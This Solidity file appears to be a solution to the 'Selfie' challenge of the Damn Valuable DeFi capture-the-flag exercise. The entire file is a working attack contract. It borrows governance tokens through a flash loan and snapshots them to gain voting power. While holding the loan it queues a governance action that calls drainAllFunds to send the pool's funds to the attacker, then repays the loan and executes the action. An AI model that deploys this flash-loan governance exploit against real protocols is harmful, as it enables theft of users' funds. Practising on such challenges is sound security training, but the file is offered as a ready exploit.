// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/token/ERC20/extensions/ERC20Snapshot.sol";
import "../DamnValuableTokenSnapshot.sol";

interface ISimpleGovernance {
  function queueAction(address receiver, bytes calldata data, uint256 weiAmount) external returns (uint256);
  function executeAction(uint256 actionId) external payable;
}

contract AttackSelfiePool is Ownable {
  
  using Address for address;
  address immutable private pool;
  ISimpleGovernance immutable private governance;
  uint256 private actionID;

  constructor(address _pool, address _governance) {
    pool = _pool;
    governance = ISimpleGovernance(_governance);
  }

  function attackStart() external onlyOwner {
    pool.functionCall(abi.encodeWithSignature("flashLoan(uint256)", 15e23));
  }

  function receiveTokens(address tokenAddress, uint256 amount) external {
    DamnValuableTokenSnapshot token = DamnValuableTokenSnapshot(tokenAddress);
    token.snapshot();
    actionID = governance.queueAction(pool, abi.encodeWithSignature("drainAllFunds(address)", address(owner())), 0);
    token.transfer(msg.sender, amount);
  }

  function attackFinish() external onlyOwner {
    governance.executeAction(actionID);
  } 
}